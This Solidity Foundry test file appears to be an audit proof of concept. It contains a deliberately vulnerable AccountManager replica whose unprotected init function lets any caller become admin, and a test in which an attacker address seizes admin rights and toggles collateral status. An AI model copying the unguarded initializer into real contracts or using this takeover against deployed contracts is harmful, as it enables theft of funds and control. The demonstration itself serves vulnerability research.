pragma solidity 0.8.20;

import "forge-std/Test.sol";

interface IRegistry {}

contract Pausable {
    address public admin;
    modifier adminOnly() { require(msg.sender == admin, "admin only"); _; }
    function initPausable(address _admin) internal { admin = _admin; }
}

// Minimal vulnerable replica (inline)
contract AccountManager is Pausable {
    bool private initialized;
    IRegistry public registry;
    mapping(address => bool) public isCollateralAllowed;

    // Vulnerable initializer: anyone can call and becomes admin via initPausable(msg.sender)
    function init(IRegistry _registry) external {
        require(!initialized, "already");
        initialized = true;
        initPausable(msg.sender);
        registry = _registry;
    }

    // admin-only function to demonstrate gained privileges
    function toggleCollateralStatus(address token) external adminOnly {
        isCollateralAllowed[token] = !isCollateralAllowed[token];
    }
}

contract AccountManagerTest is Test {
    AccountManager target;
    address attacker;
    address token = address(0xDEAD);

    function setUp() public {
        target = new AccountManager();
        attacker = makeAddr("attacker");
    }

    function test_attacker_exploits_init() public {
        // Attacker calls init and becomes admin
        vm.prank(attacker);
        target.init(IRegistry(address(0xBEEF)));

        // Now attacker can call adminOnly function
        vm.prank(attacker);
        target.toggleCollateralStatus(token);

        assertTrue(target.isCollateralAllowed(token));
    }
}

